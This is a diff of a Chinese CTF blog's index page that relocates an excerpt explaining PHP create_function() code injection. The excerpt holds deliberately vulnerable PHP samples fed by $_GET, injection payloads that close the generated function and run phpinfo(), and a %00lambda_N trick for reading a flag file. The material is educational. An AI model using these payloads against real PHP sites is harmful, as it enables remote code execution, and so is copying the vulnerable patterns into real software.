+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-36-06.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-36-06.png" alt="Snipaste_2020-12-23_16-36-06"></a></p>
+<p>这里我们先用<code>;&#125;</code>闭合了前面的语句后，又用<code>/*</code>将后面的语句注释掉。因此，我们就可以注入代码（比如一句话木马）来得到我们想要的东西。</p>
+<p><strong>但是从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃。</strong></p>
+<h3 id="案例复现"><a href="#案例复现" class="headerlink" title="案例复现"></a>案例复现</h3><h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sort_by &#x3D; $_GET[&#39;sort_by&#39;];</span><br><span class="line">$sorter &#x3D; &#39;strnatcasecmp&#39;;</span><br><span class="line">$databases&#x3D;array(&#39;1234&#39;,&#39;4321&#39;);</span><br><span class="line">$sort_function &#x3D; &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;;</span><br><span class="line">usort($databases, create_function(&#39;$a, $b&#39;, $sort_function));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接看<code>create_function()</code>中第二个参数，$sort_function中我们可以对$sort_by进行传值，注意前面有<code>(</code>和<code>[&quot;&#39;</code>我们要使其闭合。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?sort_by&#x3D;&#39;&quot;]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-08-25.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-08-25.png" alt="Snipaste_2020-12-23_17-08-25"></a></p>
+<h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">$lambda&#x3D;create_function(&#39;$a,$b&#39;,&quot;return (strlen($a)-strlen($b)+&quot; . &quot;strlen($c));&quot;);</span><br><span class="line">$array&#x3D;array(&#39;reall long string here,boy&#39;,&#39;this&#39;,&#39;midding lenth&#39;,&#39;larget&#39;);</span><br><span class="line">usort($array,$lambda);</span><br><span class="line">print_r($array);</span><br><span class="line">?&gt;   </span><br></pre></td></tr></table></figure>
+
+<p>这边同上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c&#x3D;2));&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-21-15.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-21-15.png" alt="Snipaste_2020-12-23_17-21-15"></a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10816089.html#_label0">https://www.cnblogs.com/-qing-/p/10816089.html#_label0</a></p>
+
+        
+    </article>
+    <footer class="cube-excerpt-footer">
+        <a class="cube-excerpt-more" href="/myblog/2021/03/28/%E9%A2%98%E7%9B%AE%E9%87%8C%E6%89%A9%E5%B1%95%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9create_function()%E6%B3%A8%E5%85%A5/">阅读全文</a>
+    </footer>
+</div>
+
 <div class="cube-excerpt" id="cube-excerpt-无参数RCE（一）">
     <header class="cube-excerpt-header">
         <h1><a href="/myblog/2021/03/28/%E6%97%A0%E5%8F%82%E6%95%B0RCE%EF%BC%88%E4%B8%80%EF%BC%89/">无参数RCE（一）</a></h1>
@@ -948,72 +1014,6 @@
     </footer>
 </div>
 
-<div class="cube-excerpt" id="cube-excerpt-题目里扩展的知识点create_function()注入">
-    <header class="cube-excerpt-header">
-        <h1><a href="/myblog/2021/03/28/%E9%A2%98%E7%9B%AE%E9%87%8C%E6%89%A9%E5%B1%95%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9create_function()%E6%B3%A8%E5%85%A5/">题目里扩展的知识点create_function()注入</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                2021-03-28
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-                <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="cube-excerpt-tag-link">#知识点</a>
-                
-            </div>
-        </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
-        
-        
-           <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a &#x3D; create_function(&quot;&quot;, &quot;echo(&#96;cat &#x2F;flag&#96;);&quot;);</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">     $_GET[&#39;a&#39;]();</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>只要我们知道了create_function这个匿名函数的名字并赋值给a，就能得到flag。</p>
-<p><code>create_function()</code>根据传递的参数创建匿名函数，并返回该函数的唯一名称。（函数名称<code>lambda_&#39;数字&#39;</code>）</p>
-<p>而且每刷新一次<code>lambda_&#39;数字&#39;</code>的数字就会+1</p>
-<p>举一个例子</p>
-<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-03-01.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-03-01.png" alt="Snipaste_2020-12-23_16-03-01"></a></p>
-<p>这里echo出来的还有一个不可见字符，我们可以用%00代替，<code>%00lambda_1</code></p>
-<p>这边我直接用<code>%00lambda_1</code>就出了flag</p>
-<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_14-27-47.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_14-27-47.png" alt="Snipaste_2020-12-23_14-27-47"></a></p>
-<p>其实一般是要进行爆破，可以用burp suite进行抓包，然后爆破。</p>
-<ul>
-<li><p>上面例子中<code>create_function(&quot;&quot;,&quot;echo(&#39;haha&#39;);&quot;);</code>其实等价于</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function ambda_1()&#123;</span><br><span class="line">    echo(&quot;haha&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="create-function-实现代码注入"><a href="#create-function-实现代码注入" class="headerlink" title="create_function() 实现代码注入"></a>create_function() 实现代码注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; &#39;echo &#39;.$t.&#39;dasdasd&#39;.$a.&quot;;&quot;;</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$c &#x3D; create_function(&quot;$t&quot;,$b);</span><br><span class="line">?&gt;</span><br><span class="line">   # payload:  ?a&#x3D;2;&#125;phpinfo();&#x2F;*    </span><br></pre></td></tr></table></figure>
-
-<p>还原实际的组合过程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; &#39;echo &#39;.$t.&#39;dasdasd&#39;.2;&#125;phpinfo();&#x2F;* .&quot;;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>匿名函数实际的执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function %00lambda_‘数字’($t)&#123;</span><br><span class="line">echo .$t.&#39;dasdasd&#39;.2;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();&#x2F;* .&quot;;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-36-06.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-36-06.png" alt="Snipaste_2020-12-23_16-36-06"></a></p>
-<p>这里我们先用<code>;&#125;</code>闭合了前面的语句后，又用<code>/*</code>将后面的语句注释掉。因此，我们就可以注入代码（比如一句话木马）来得到我们想要的东西。</p>
-<p><strong>但是从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃。</strong></p>
-<h3 id="案例复现"><a href="#案例复现" class="headerlink" title="案例复现"></a>案例复现</h3><h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sort_by &#x3D; $_GET[&#39;sort_by&#39;];</span><br><span class="line">$sorter &#x3D; &#39;strnatcasecmp&#39;;</span><br><span class="line">$databases&#x3D;array(&#39;1234&#39;,&#39;4321&#39;);</span><br><span class="line">$sort_function &#x3D; &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;;</span><br><span class="line">usort($databases, create_function(&#39;$a, $b&#39;, $sort_function));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>直接看<code>create_function()</code>中第二个参数，$sort_function中我们可以对$sort_by进行传值，注意前面有<code>(</code>和<code>[&quot;&#39;</code>我们要使其闭合。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?sort_by&#x3D;&#39;&quot;]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-08-25.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-08-25.png" alt="Snipaste_2020-12-23_17-08-25"></a></p>
-<h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">$lambda&#x3D;create_function(&#39;$a,$b&#39;,&quot;return (strlen($a)-strlen($b)+&quot; . &quot;strlen($c));&quot;);</span><br><span class="line">$array&#x3D;array(&#39;reall long string here,boy&#39;,&#39;this&#39;,&#39;midding lenth&#39;,&#39;larget&#39;);</span><br><span class="line">usort($array,$lambda);</span><br><span class="line">print_r($array);</span><br><span class="line">?&gt;   </span><br></pre></td></tr></table></figure>
-
-<p>这边同上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c&#x3D;2));&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-21-15.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_17-21-15.png" alt="Snipaste_2020-12-23_17-21-15"></a></p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10816089.html#_label0">https://www.cnblogs.com/-qing-/p/10816089.html#_label0</a></p>
-
-        
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/myblog/2021/03/28/%E9%A2%98%E7%9B%AE%E9%87%8C%E6%89%A9%E5%B1%95%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9create_function()%E6%B3%A8%E5%85%A5/">阅读全文</a>
-    </footer>
-</div>
-
 
 
 <ul class="cube-pagination cube-pagination-6">
@@ -1136,7 +1136,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a>
+                    <a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="ctf-Crypto常见加解密">ctf-Crypto常见加解密</a>
                 </p>
             </div>
         </li>
@@ -1149,7 +1149,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="ctf-Crypto常见加解密">ctf-Crypto常见加解密</a>
+                    <a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a>
                 </p>
             </div>
         </li>
@@ -1193,7 +1193,7 @@
     <div class="cube-boxs">
         
         
-        <div class="cube-box ">
+        <div class="cube-box-bg ">
             <a href="/myblog/categories/%E7%BB%83%E4%B9%A0/">#练习</a>
         </div>
         
